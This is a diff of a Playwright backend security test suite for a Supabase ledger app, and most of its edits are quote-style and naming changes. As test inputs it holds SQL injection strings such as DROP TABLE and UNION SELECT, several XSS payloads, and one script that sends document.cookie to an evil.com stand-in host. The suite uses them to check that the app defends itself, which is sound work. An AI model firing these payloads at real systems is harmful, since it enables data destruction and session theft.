@@ -1,9 +1,9 @@
-import { test, expect } from '@playwright/test';
-import { createClient, SupabaseClient } from '@supabase/supabase-js';
-import type { Database } from '../../src/lib/database.types';
+import { test, expect } from "@playwright/test";
+import { createClient, SupabaseClient } from "@supabase/supabase-js";
+import type { Database } from "../../src/lib/database.types";
 
 /**
- * Backend Security Tests for Global Ledger v8 MVP
+ * Backend Security Tests for Ledgerly v8 MVP
  *
  * These tests verify:
  * - SQL Injection prevention
@@ -24,8 +24,8 @@ const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;
 const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY!;
 
 // Test user credentials
-const TEST_USER_EMAIL = process.env.TEST_USER_EMAIL || 'test@example.com';
-const TEST_USER_PASSWORD = process.env.TEST_USER_PASSWORD || 'testpassword123';
+const TEST_USER_EMAIL = process.env.TEST_USER_EMAIL || "test@example.com";
+const TEST_USER_PASSWORD = process.env.TEST_USER_PASSWORD || "testpassword123";
 
 let supabase: SupabaseClient<Database>;
 let adminClient: SupabaseClient<Database>;
@@ -36,7 +36,7 @@ let testCustomerId: string | null = null;
 const createdCustomerIds: string[] = [];
 const createdTransactionIds: string[] = [];
 
-test.describe('Backend Security Tests', () => {
+test.describe("Backend Security Tests", () => {
   test.beforeAll(async () => {
     // Create anonymous client
     supabase = createClient<Database>(supabaseUrl, supabaseAnonKey);
@@ -62,11 +62,11 @@ test.describe('Backend Security Tests', () => {
 
       // Create a test customer for security tests
       const { data: customer } = await supabase
-        .from('customers')
+        .from("customers")
         .insert({
           user_id: testUserId,
-          name: 'Security Test Customer',
-          phone: '+1999999999',
+          name: "Security Test Customer",
+          phone: "+1999999999",
         })
         .select()
         .single();
@@ -82,33 +82,30 @@ test.describe('Backend Security Tests', () => {
     // Cleanup
     if (adminClient && createdTransactionIds.length > 0) {
       await adminClient
-        .from('transactions')
+        .from("transactions")
         .delete()
-        .in('id', createdTransactionIds);
+        .in("id", createdTransactionIds);
     }
 
     if (adminClient && createdCustomerIds.length > 0) {
-      await adminClient
-        .from('customers')
-        .delete()
-        .in('id', createdCustomerIds);
+      await adminClient.from("customers").delete().in("id", createdCustomerIds);
     }
 
     await supabase.auth.signOut();
   });
 
-  test.describe('SQL Injection Prevention', () => {
-    test('should safely handle SQL injection attempt in customer name', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+  test.describe("SQL Injection Prevention", () => {
+    test("should safely handle SQL injection attempt in customer name", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
       const sqlInjectionPayload = "'; DROP TABLE customers; --";
 
       const { data, error } = await supabase
-        .from('customers')
+        .from("customers")
         .insert({
           user_id: testUserId!,
           name: sqlInjectionPayload,
-          phone: '+1111111111',
+          phone: "+1111111111",
         })
         .select()
         .single();
@@ -124,16 +121,16 @@ test.describe('Backend Security Tests', () => {
 
       // Verify customers table still exists
       const { data: customers, error: selectError } = await supabase
-        .from('customers')
-        .select('id')
+        .from("customers")
+        .select("id")
         .limit(1);
 
       expect(selectError).toBeNull();
       expect(customers).toBeDefined();
     });
 
-    test('should safely handle SQL injection in search queries', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should safely handle SQL injection in search queries", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
       const injectionPayloads = [
         "' OR '1'='1",
@@ -144,10 +141,10 @@ test.describe('Backend Security Tests', () => {
 
       for (const payload of injectionPayloads) {
         const { data, error } = await supabase
-          .from('customers')
-          .select('*')
-          .eq('user_id', testUserId)
-          .ilike('name', `%${payload}%`);
+          .from("customers")
+          .select("*")
+          .eq("user_id", testUserId)
+          .ilike("name", `%${payload}%`);
 
         // Query should execute safely without error
         expect(error).toBeNull();
@@ -157,18 +154,17 @@ test.describe('Backend Security Tests', () => {
       }
     });
 
-    test('should safely handle SQL injection in transaction description', async () => {
-      test.skip(!testUserId || !testCustomerId, 'No test user or customer');
+    test("should safely handle SQL injection in transaction description", async () => {
+      test.skip(!testUserId || !testCustomerId, "No test user or customer");
 
-      const injectionPayload =
-        "'); UPDATE customers SET is_deleted = true; --";
+      const injectionPayload = "'); UPDATE customers SET is_deleted = true; --";
 
       const { data, error } = await supabase
-        .from('transactions')
+        .from("transactions")
         .insert({
           user_id: testUserId!,
           customer_id: testCustomerId!,
-          type: 'debt',
+          type: "debt",
           amount: 100,
           description: injectionPayload,
         })
@@ -185,32 +181,32 @@ test.describe('Backend Security Tests', () => {
 
       // Verify customer was not affected
       const { data: customer } = await supabase
-        .from('customers')
-        .select('is_deleted')
-        .eq('id', testCustomerId)
+        .from("customers")
+        .select("is_deleted")
+        .eq("id", testCustomerId)
         .single();
 
       expect(customer?.is_deleted).toBeFalsy();
     });
 
-    test('should safely handle numeric SQL injection', async () => {
-      test.skip(!testUserId || !testCustomerId, 'No test user or customer');
+    test("should safely handle numeric SQL injection", async () => {
+      test.skip(!testUserId || !testCustomerId, "No test user or customer");
 
       // These should be rejected by type checking or stored as literal strings
       const numericInjectionPayloads = [
-        '1 OR 1=1',
-        '1; DROP TABLE transactions',
-        '1 UNION SELECT * FROM user_profiles',
+        "1 OR 1=1",
+        "1; DROP TABLE transactions",
+        "1 UNION SELECT * FROM user_profiles",
       ];
 
       for (const payload of numericInjectionPayloads) {
         // Try to inject via amount field (should fail type validation)
         const { data, error } = await supabase
-          .from('transactions')
+          .from("transactions")
           .insert({
             user_id: testUserId!,
             customer_id: testCustomerId!,
-            type: 'debt',
+            type: "debt",
             amount: payload as any, // Force type to bypass TS
           })
           .select()
@@ -222,9 +218,9 @@ test.describe('Backend Security Tests', () => {
     });
   });
 
-  test.describe('XSS Prevention (Input Sanitization)', () => {
-    test('should safely store XSS payload as literal text in customer name', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+  test.describe("XSS Prevention (Input Sanitization)", () => {
+    test("should safely store XSS payload as literal text in customer name", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
       const xssPayloads = [
         '<script>alert("XSS")</script>',
@@ -236,11 +232,11 @@ test.describe('Backend Security Tests', () => {
 
       for (const payload of xssPayloads) {
         const { data, error } = await supabase
-          .from('customers')
+          .from("customers")
           .insert({
             user_id: testUserId!,
             name: payload,
-            phone: '+1222222222',
+            phone: "+1222222222",
           })
           .select()
           .single();
@@ -256,18 +252,18 @@ test.describe('Backend Security Tests', () => {
       }
     });
 
-    test('should safely store XSS payload in transaction description', async () => {
-      test.skip(!testUserId || !testCustomerId, 'No test user or customer');
+    test("should safely store XSS payload in transaction description", async () => {
+      test.skip(!testUserId || !testCustomerId, "No test user or customer");
 
       const xssPayload =
         '<script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>';
 
       const { data, error } = await supabase
-        .from('transactions')
+        .from("transactions")
         .insert({
           user_id: testUserId!,
           customer_id: testCustomerId!,
-          type: 'debt',
+          type: "debt",
           amount: 50,
           description: xssPayload,
         })
@@ -283,17 +279,17 @@ test.describe('Backend Security Tests', () => {
       }
     });
 
-    test('should handle HTML entities in input', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should handle HTML entities in input", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
-      const htmlEntities = '&lt;script&gt;alert(1)&lt;/script&gt;';
+      const htmlEntities = "&lt;script&gt;alert(1)&lt;/script&gt;";
 
       const { data, error } = await supabase
-        .from('customers')
+        .from("customers")
         .insert({
           user_id: testUserId!,
           name: htmlEntities,
-          phone: '+1333333333',
+          phone: "+1333333333",
         })
         .select()
         .single();
@@ -307,22 +303,22 @@ test.describe('Backend Security Tests', () => {
       }
     });
 
-    test('should handle unicode that could be used for XSS', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should handle unicode that could be used for XSS", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
       const unicodePayloads = [
-        '\u003cscript\u003ealert(1)\u003c/script\u003e', // Unicode escaped
-        '%3Cscript%3Ealert(1)%3C/script%3E', // URL encoded
-        '\uff1cscript\uff1e', // Full-width characters
+        "\u003cscript\u003ealert(1)\u003c/script\u003e", // Unicode escaped
+        "%3Cscript%3Ealert(1)%3C/script%3E", // URL encoded
+        "\uff1cscript\uff1e", // Full-width characters
       ];
 
       for (const payload of unicodePayloads) {
         const { data, error } = await supabase
-          .from('customers')
+          .from("customers")
           .insert({
             user_id: testUserId!,
             name: payload,
-            phone: '+1444444444',
+            phone: "+1444444444",
           })
           .select()
           .single();
@@ -338,14 +334,14 @@ test.describe('Backend Security Tests', () => {
     });
   });
 
-  test.describe('Authentication Security', () => {
-    test('should reject unauthenticated access to protected data', async () => {
+  test.describe("Authentication Security", () => {
+    test("should reject unauthenticated access to protected data", async () => {
       // Sign out first
       await supabase.auth.signOut();
 
       const { data, error } = await supabase
-        .from('customers')
-        .select('*')
+        .from("customers")
+        .select("*")
         .limit(1);
 
       // Should return empty (RLS blocks) or error
@@ -358,14 +354,14 @@ test.describe('Backend Security Tests', () => {
       });
     });
 
-    test('should reject unauthenticated data creation', async () => {
+    test("should reject unauthenticated data creation", async () => {
       await supabase.auth.signOut();
 
       const { data, error } = await supabase
-        .from('customers')
+        .from("customers")
         .insert({
-          user_id: '00000000-0000-0000-0000-000000000000',
-          name: 'Should Not Create',
+          user_id: "00000000-0000-0000-0000-000000000000",
+          name: "Should Not Create",
         })
         .select()
         .single();
@@ -379,15 +375,15 @@ test.describe('Backend Security Tests', () => {
       });
     });
 
-    test('should reject unauthenticated data updates', async () => {
-      test.skip(!testCustomerId, 'No test customer');
+    test("should reject unauthenticated data updates", async () => {
+      test.skip(!testCustomerId, "No test customer");
 
       await supabase.auth.signOut();
 
       const { data, error } = await supabase
-        .from('customers')
-        .update({ name: 'Should Not Update' })
-        .eq('id', testCustomerId!)
+        .from("customers")
+        .update({ name: "Should Not Update" })
+        .eq("id", testCustomerId!)
         .select()
         .single();
 
@@ -399,15 +395,15 @@ test.describe('Backend Security Tests', () => {
       });
     });
 
-    test('should reject unauthenticated data deletion', async () => {
-      test.skip(!testCustomerId, 'No test customer');
+    test("should reject unauthenticated data deletion", async () => {
+      test.skip(!testCustomerId, "No test customer");
 
       await supabase.auth.signOut();
 
       const { error } = await supabase
-        .from('customers')
+        .from("customers")
         .delete()
-        .eq('id', testCustomerId!);
+        .eq("id", testCustomerId!);
 
       // Should be blocked by RLS
       expect(error).toBeDefined();
@@ -418,16 +414,16 @@ test.describe('Backend Security Tests', () => {
       });
     });
 
-    test('should not allow accessing other users data', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should not allow accessing other users data", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
       // Try to access data belonging to a different user
-      const fakeUserId = '00000000-0000-0000-0000-000000000000';
+      const fakeUserId = "00000000-0000-0000-0000-000000000000";
 
       const { data, error } = await supabase
-        .from('customers')
-        .select('*')
-        .eq('user_id', fakeUserId);
+        .from("customers")
+        .select("*")
+        .eq("user_id", fakeUserId);
 
       expect(error).toBeNull();
       // Should return empty array (no access to other user's data)
@@ -435,13 +431,11 @@ test.describe('Backend Security Tests', () => {
     });
   });
 
-  test.describe('Authorization Enforcement', () => {
-    test('should enforce RLS on customer reads', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+  test.describe("Authorization Enforcement", () => {
+    test("should enforce RLS on customer reads", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
-      const { data, error } = await supabase
-        .from('customers')
-        .select('*');
+      const { data, error } = await supabase.from("customers").select("*");
 
       expect(error).toBeNull();
       expect(data).toBeDefined();
@@ -452,12 +446,10 @@ test.describe('Backend Security Tests', () => {
       });
     });
 
-    test('should enforce RLS on transaction reads', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should enforce RLS on transaction reads", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
-      const { data, error } = await supabase
-        .from('transactions')
-        .select('*');
+      const { data, error } = await supabase.from("transactions").select("*");
 
       expect(error).toBeNull();
       expect(data).toBeDefined();
@@ -468,12 +460,10 @@ test.describe('Backend Security Tests', () => {
       });
     });
 
-    test('should enforce RLS on user_profile reads', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should enforce RLS on user_profile reads", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
-      const { data, error } = await supabase
-        .from('user_profiles')
-        .select('*');
+      const { data, error } = await supabase.from("user_profiles").select("*");
 
       expect(error).toBeNull();
       expect(data).toBeDefined();
@@ -483,13 +473,13 @@ test.describe('Backend Security Tests', () => {
       expect(data![0].id).toBe(testUserId);
     });
 
-    test('should prevent updating other users customers', async () => {
-      const randomUuid = '00000000-0000-0000-0000-000000000001';
+    test("should prevent updating other users customers", async () => {
+      const randomUuid = "00000000-0000-0000-0000-000000000001";
 
       const { data, error } = await supabase
-        .from('customers')
-        .update({ name: 'Hacked!' })
-        .eq('id', randomUuid)
+        .from("customers")
+        .update({ name: "Hacked!" })
+        .eq("id", randomUuid)
         .select()
         .single();
 
@@ -497,13 +487,13 @@ test.describe('Backend Security Tests', () => {
       expect(error || data === null).toBeTruthy();
     });
 
-    test('should prevent deleting other users customers', async () => {
-      const randomUuid = '00000000-0000-0000-0000-000000000002';
+    test("should prevent deleting other users customers", async () => {
+      const randomUuid = "00000000-0000-0000-0000-000000000002";
 
       const { data, error } = await supabase
-        .from('customers')
+        .from("customers")
         .delete()
-        .eq('id', randomUuid)
+        .eq("id", randomUuid)
         .select()
         .single();
 
@@ -512,17 +502,17 @@ test.describe('Backend Security Tests', () => {
     });
   });
 
-  test.describe('Input Validation Security', () => {
-    test('should reject empty required fields', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+  test.describe("Input Validation Security", () => {
+    test("should reject empty required fields", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
       // Empty name should be rejected
       const { data, error } = await supabase
-        .from('customers')
+        .from("customers")
         .insert({
           user_id: testUserId!,
-          name: '',
-          phone: '+1555555555',
+          name: "",
+          phone: "+1555555555",
         })
         .select()
         .single();
@@ -531,15 +521,15 @@ test.describe('Backend Security Tests', () => {
       expect(error || data === null).toBeTruthy();
     });
 
-    test('should reject invalid transaction types', async () => {
-      test.skip(!testUserId || !testCustomerId, 'No test user or customer');
+    test("should reject invalid transaction types", async () => {
+      test.skip(!testUserId || !testCustomerId, "No test user or customer");
 
       const { data, error } = await supabase
-        .from('transactions')
+        .from("transactions")
         .insert({
           user_id: testUserId!,
           customer_id: testCustomerId!,
-          type: 'invalid_type' as any,
+          type: "invalid_type" as any,
           amount: 100,
         })
         .select()
@@ -549,16 +539,16 @@ test.describe('Backend Security Tests', () => {
       expect(data).toBeNull();
     });
 
-    test('should reject zero or negative amounts', async () => {
-      test.skip(!testUserId || !testCustomerId, 'No test user or customer');
+    test("should reject zero or negative amounts", async () => {
+      test.skip(!testUserId || !testCustomerId, "No test user or customer");
 
       // Zero amount
       const { data: zeroData, error: zeroError } = await supabase
-        .from('transactions')
+        .from("transactions")
         .insert({
           user_id: testUserId!,
           customer_id: testCustomerId!,
-          type: 'debt',
+          type: "debt",
           amount: 0,
         })
         .select()
@@ -569,11 +559,11 @@ test.describe('Backend Security Tests', () => {
 
       // Negative amount
       const { data: negData, error: negError } = await supabase
-        .from('transactions')
+        .from("transactions")
         .insert({
           user_id: testUserId!,
           customer_id: testCustomerId!,
-          type: 'debt',
+          type: "debt",
           amount: -100,
         })
         .select()
@@ -583,17 +573,17 @@ test.describe('Backend Security Tests', () => {
       expect(negData).toBeNull();
     });
 
-    test('should reject invalid foreign keys', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should reject invalid foreign keys", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
-      const fakeCustomerId = '00000000-0000-0000-0000-000000000000';
+      const fakeCustomerId = "00000000-0000-0000-0000-000000000000";
 
       const { data, error } = await supabase
-        .from('transactions')
+        .from("transactions")
         .insert({
           user_id: testUserId!,
           customer_id: fakeCustomerId,
-          type: 'debt',
+          type: "debt",
           amount: 100,
         })
         .select()
@@ -604,17 +594,17 @@ test.describe('Backend Security Tests', () => {
       expect(data).toBeNull();
     });
 
-    test('should handle extremely long input strings', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should handle extremely long input strings", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
-      const veryLongName = 'A'.repeat(10000);
+      const veryLongName = "A".repeat(10000);
 
       const { data, error } = await supabase
-        .from('customers')
+        .from("customers")
         .insert({
           user_id: testUserId!,
           name: veryLongName,
-          phone: '+1666666666',
+          phone: "+1666666666",
         })
         .select()
         .single();
@@ -627,13 +617,13 @@ test.describe('Backend Security Tests', () => {
       }
     });
 
-    test('should handle special characters in all fields', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should handle special characters in all fields", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
-      const specialChars = '!@#$%^&*()_+-=[]{}|;\':",./<>?`~';
+      const specialChars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~";
 
       const { data, error } = await supabase
-        .from('customers')
+        .from("customers")
         .insert({
           user_id: testUserId!,
           name: specialChars,
@@ -654,14 +644,14 @@ test.describe('Backend Security Tests', () => {
     });
   });
 
-  test.describe('Data Exposure Prevention', () => {
-    test('should not expose other users in queries', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+  test.describe("Data Exposure Prevention", () => {
+    test("should not expose other users in queries", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
       // Query all customers - should only return current user's
       const { data, error } = await supabase
-        .from('customers')
-        .select('user_id')
+        .from("customers")
+        .select("user_id")
         .limit(100);
 
       expect(error).toBeNull();
@@ -673,13 +663,13 @@ test.describe('Backend Security Tests', () => {
       expect(uniqueUserIds.has(testUserId!)).toBe(true);
     });
 
-    test('should not expose internal timestamps inappropriately', async () => {
-      test.skip(!testCustomerId, 'No test customer');
+    test("should not expose internal timestamps inappropriately", async () => {
+      test.skip(!testCustomerId, "No test customer");
 
       const { data, error } = await supabase
-        .from('customers')
-        .select('created_at, updated_at')
-        .eq('id', testCustomerId!)
+        .from("customers")
+        .select("created_at, updated_at")
+        .eq("id", testCustomerId!)
         .single();
 
       // Timestamps should exist but be properly formatted
@@ -690,13 +680,13 @@ test.describe('Backend Security Tests', () => {
       expect(() => new Date(data!.created_at!).toISOString()).not.toThrow();
     });
 
-    test('should not leak data in error messages', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+    test("should not leak data in error messages", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
       const { data, error } = await supabase
-        .from('customers')
-        .select('*')
-        .eq('id', 'invalid-uuid-format')
+        .from("customers")
+        .select("*")
+        .eq("id", "invalid-uuid-format")
         .single();
 
       // Error should not contain sensitive information
@@ -705,30 +695,30 @@ test.describe('Backend Security Tests', () => {
         // Error message should be generic, not expose table structure
         const errorMsg = error.message.toLowerCase();
         // Should not contain SQL details
-        expect(errorMsg).not.toContain('select');
-        expect(errorMsg).not.toContain('from');
-        expect(errorMsg).not.toContain('where');
+        expect(errorMsg).not.toContain("select");
+        expect(errorMsg).not.toContain("from");
+        expect(errorMsg).not.toContain("where");
       }
     });
   });
 
-  test.describe('Concurrent Request Security', () => {
-    test('should handle concurrent customer creation safely', async () => {
-      test.skip(!testUserId, 'No test user authenticated');
+  test.describe("Concurrent Request Security", () => {
+    test("should handle concurrent customer creation safely", async () => {
+      test.skip(!testUserId, "No test user authenticated");
 
       const concurrentRequests = 5;
       const promises = Array(concurrentRequests)
         .fill(null)
         .map((_, i) =>
           supabase
-            .from('customers')
+            .from("customers")
             .insert({
               user_id: testUserId!,
               name: `Concurrent Test ${i}`,
               phone: `+1777777777${i}`,
             })
             .select()
-            .single()
+            .single(),
         );
 
       const results = await Promise.all(promises);
@@ -742,23 +732,23 @@ test.describe('Backend Security Tests', () => {
       });
     });
 
-    test('should handle concurrent transaction creation safely', async () => {
-      test.skip(!testUserId || !testCustomerId, 'No test user or customer');
+    test("should handle concurrent transaction creation safely", async () => {
+      test.skip(!testUserId || !testCustomerId, "No test user or customer");
 
       const concurrentRequests = 5;
       const promises = Array(concurrentRequests)
         .fill(null)
         .map((_, i) =>
           supabase
-            .from('transactions')
+            .from("transactions")
             .insert({
               user_id: testUserId!,
               customer_id: testCustomerId!,
-              type: i % 2 === 0 ? 'debt' : 'payment',
+              type: i % 2 === 0 ? "debt" : "payment",
               amount: 10 * (i + 1),
             })
             .select()
-            .single()
+            .single(),
         );
 
       const results = await Promise.all(promises);
